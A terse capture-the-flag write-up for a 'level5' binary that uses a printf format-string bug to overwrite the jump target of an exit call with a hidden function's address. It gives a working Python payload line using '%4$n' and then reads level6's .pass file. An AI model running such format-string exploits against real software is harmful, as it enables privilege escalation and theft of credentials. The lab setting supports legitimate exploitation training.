level5 binary with the rights of level6

main calls n

n fgets then calls printf
then calls exits

another function called o does a syscall then uses a different exit call (different address)

we can exploit printf like previously

the exit calls is not direct, it jumps to *0x8049838

let's change 0x8049838's value to the start of function o

we can modify the 4th registery.

python -c 'print("\x38\x98\x04\x08" + "0134513824d" + "%4$n")' > exploit // 134513824 is o's address in decimal - 4

cat exploit - | ./level5

we can cat /home/user/level6/.pass
